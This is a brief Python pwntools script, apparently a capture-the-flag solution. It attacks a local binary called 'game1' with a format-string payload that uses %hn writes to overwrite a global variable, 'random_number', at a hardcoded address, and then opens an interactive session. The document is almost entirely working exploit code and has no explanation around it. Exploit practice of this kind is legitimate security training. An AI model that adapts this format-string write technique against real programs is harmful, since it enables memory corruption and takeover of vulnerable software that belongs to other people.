from pwn import *
#context.log_level = 'debug'
p = process('./game1')
e = ELF('./game1')


#gdb.attach(p)
random_number = 0x555555558030

payload =  b''
payload += b'%11867c'
payload += b'%12$hn'
payload += b'%50198c'
payload += b'%13$hn'
payload += b'AAAAAA'
payload += p64(random_number+2)
payload += p64(random_number)

#payload = b'aa'
#pause()
p.sendline(payload)



p.interactive()